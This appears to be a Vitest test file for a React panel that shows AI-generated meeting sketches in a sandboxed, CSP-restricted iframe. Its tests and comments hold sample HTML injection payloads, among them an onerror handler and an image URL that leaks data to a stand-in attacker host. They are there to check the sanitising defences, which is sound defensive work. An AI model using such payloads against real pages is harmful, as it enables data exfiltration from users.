// The per-agent output panel.
//
// The HTML mode carries two load-bearing assertions, because one control is not
// enough. That document is model-generated from meeting transcript, so:
//
//   1. It renders in a `srcDoc` frame with `allow-scripts` but deliberately
//      WITHOUT `allow-same-origin` — the pair is what gives the frame a null
//      origin, so its scripts cannot reach this page, its cookies, or the
//      gateway. Adding `allow-same-origin` would silently defeat that.
//   2. A null origin blocks READING this page and does nothing about outbound
//      requests, so the srcdoc must also carry the egress-denying CSP that
//      `buildSketchSrcdoc` prepends. Rendering `output` raw was the BLOCKING
//      finding; the wiring test below is what stops it coming back.
//   3. And the CSP alone was not enough either: it grants `script-src
//      'unsafe-inline'`, so the model's own `<script>` ran in the frame and could
//      stream the transcript out over DNS-prefetch lookups no CSP governs.
//      `buildSketchSrcdoc` now strips the model's scripts and event handlers.
//
// The CSP's own content, and the scrub in both directions (nothing executable
// survives / Mermaid and tables still render), are asserted in
// sketchSrcdoc.test.ts. This file only pins the WIRING — that the panel routes
// `output` through that builder instead of handing it to `srcDoc` raw.

import { describe, it, expect, vi, afterEach } from 'vitest'
import { render, screen, fireEvent, cleanup } from '@testing-library/react'

import AgentPanel from '../apps/meetings/components/AgentPanel'
import type { AgentDef } from '../apps/meetings/api'
import { MERMAID_RUNTIME_PATH } from '../lib/vendorPaths'

const MARKDOWN: AgentDef = { id: 'note-taker', name: 'Note Taker', widget_type: 'markdown' }
const HTML: AgentDef = { id: 'sketch-artist', name: 'Sketch Artist', widget_type: 'html' }
const CHAT: AgentDef = { id: 'helper', name: 'Helper', widget_type: 'chat' }

function mount(agent: AgentDef, overrides: Partial<React.ComponentProps<typeof AgentPanel>> = {}) {
  const props: React.ComponentProps<typeof AgentPanel> = {
    agent,
    output: '',
    listening: true,
    chatView: false,
    onToggleListening: vi.fn(),
    onToggleChatView: vi.fn(),
    onSendMessage: vi.fn(),
    ...overrides,
  }
  return { props, ...render(<AgentPanel {...props} />) }
}

afterEach(cleanup)

describe('AgentPanel — html output', () => {
  it('renders the document in a null-origin sandboxed iframe', () => {
    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
    const frame = container.querySelector('iframe')!
    expect(frame.getAttribute('srcdoc')).toContain('Architecture')
    const sandbox = frame.getAttribute('sandbox')!
    expect(sandbox).toContain('allow-scripts')
    // Combining allow-scripts with allow-same-origin removes the sandbox's whole
    // point — the frame could then script this document.
    expect(sandbox).not.toContain('allow-same-origin')
  })

  it('never injects the model document into this page', () => {
    const { container } = mount(HTML, {
      output: '<img id="pwn" src="data:," onerror="stolen()">',
    })
    // The payload must exist ONLY as an iframe attribute, never as live DOM here:
    // no <img> in THIS tree means nothing of the model document was mounted.
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('#pwn')).toBeNull()
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    // It did reach the frame — this is a handoff, not a drop.
    expect(srcdoc).toContain('id="pwn"')
    // And the handler was removed on the way. This assertion used to read
    // `toContain('onerror')`: at the time, keeping the handler was harmless
    // BECAUSE it only ever lived in a sandboxed frame. It is now stripped by
    // buildSketchSrcdoc's scrub (an `onerror` is script, and model script in that
    // frame was the DNS-exfiltration finding), so the polarity flips — the frame
    // never sees it at all, which is strictly stronger than what was asserted
    // before.
    expect(srcdoc).not.toContain('onerror')
    expect(srcdoc).not.toContain('stolen')
  })

  it('shows a placeholder before any output arrives', () => {
    const { container } = mount(HTML)
    expect(container.querySelector('iframe')).toBeNull()
    expect(screen.getByText('Sketch Artist output will appear here.')).toBeTruthy()
  })

  it('gives the frame an accessible title', () => {
    const { container } = mount(HTML, { output: '<p>x</p>' })
    expect(container.querySelector('iframe')!.getAttribute('title')).toContain('Sketch Artist')
  })

  it('never hands the model document to srcDoc raw — it goes through buildSketchSrcdoc', () => {
    // This is the BLOCKING finding, as a test. The vulnerable version set
    // srcDoc={output} directly, so the srcdoc equalled the model HTML exactly
    // and carried no policy at all.
    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc).not.toBe('<h1>Architecture</h1>')
    expect(srcdoc).toContain('Content-Security-Policy')
    // The two directives that close the exfiltration channel.
    expect(srcdoc).toContain("connect-src 'none'")
    expect(srcdoc).toContain('img-src data:;')
    // ...and the model content still renders.
    expect(srcdoc).toContain('<h1>Architecture</h1>')
  })

  it('puts the policy ahead of the model HTML, and grants img-src no https:', () => {
    // A <meta> CSP binds only from where it is parsed, so an <img> allowed to
    // parse first would fire under no policy. The reported repro is exactly an
    // HTTPS image URL.
    const { container } = mount(HTML, {
      output: '<img id="pwn" src="https://evil.example/?d=leak">',
    })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('id="pwn"'))
    const imgSrc = srcdoc.match(/img-src ([^;]*);/)![1]
    expect(imgSrc).not.toContain('https:')
    expect(imgSrc).not.toContain('*')
  })

  it('serves Mermaid from our own origin so the frame needs no network', () => {
    const { container } = mount(HTML, { output: '<div class="mermaid">graph TD;A-->B</div>' })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc).toContain(`${window.location.origin}${MERMAID_RUNTIME_PATH}`)
    // script-src is pinned to that one FILE, never to the bare origin (a script
    // URL is an egress channel too).
    expect(srcdoc).toContain(
      `script-src 'unsafe-inline' ${window.location.origin}${MERMAID_RUNTIME_PATH};`,
    )
  })
})

describe('AgentPanel — markdown output', () => {
  it('renders the notes', () => {
    mount(MARKDOWN, { output: '# Standup\n\nDecided to ship' })
    expect(screen.getByText('Decided to ship')).toBeTruthy()
  })

  it('offers the chat toggle', () => {
    const onToggleChatView = vi.fn()
    mount(MARKDOWN, { onToggleChatView })
    fireEvent.click(screen.getByLabelText('Show chat'))
    expect(onToggleChatView).toHaveBeenCalled()
  })

  it('reports a listening toggle', () => {
    const onToggleListening = vi.fn()
    mount(MARKDOWN, { onToggleListening, listening: true })
    fireEvent.click(screen.getByLabelText('Mute Note Taker'))
    expect(onToggleListening).toHaveBeenCalled()
  })

  it('labels the control by what it will DO, not by the current state', () => {
    mount(MARKDOWN, { listening: false })
    expect(screen.getByLabelText('Unmute Note Taker')).toBeTruthy()
  })
})

describe('AgentPanel — chat mode', () => {
  it('a chat-type agent has no output/chat toggle', () => {
    mount(CHAT)
    expect(screen.queryByLabelText('Show chat')).toBeNull()
    expect(screen.queryByLabelText('Show output')).toBeNull()
  })

  it('sends a message and echoes it locally', () => {
    const onSendMessage = vi.fn()
    mount(CHAT, { onSendMessage })
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'add the decision log' } })
    fireEvent.keyDown(input, { key: 'Enter' })
    expect(onSendMessage).toHaveBeenCalledWith('add the decision log')
    expect(input.value).toBe('')
    expect(screen.getByText('add the decision log')).toBeTruthy()
  })

  it('refuses an empty message', () => {
    const onSendMessage = vi.fn()
    mount(CHAT, { onSendMessage })
    fireEvent.keyDown(screen.getByRole('textbox'), { key: 'Enter' })
    expect(onSendMessage).not.toHaveBeenCalled()
  })

  it('a markdown agent in chat view shows the chat surface', () => {
    mount(MARKDOWN, { chatView: true, output: '# ignored while chatting' })
    expect(screen.getByRole('textbox')).toBeTruthy()
    expect(screen.getByLabelText('Show output')).toBeTruthy()
  })
})
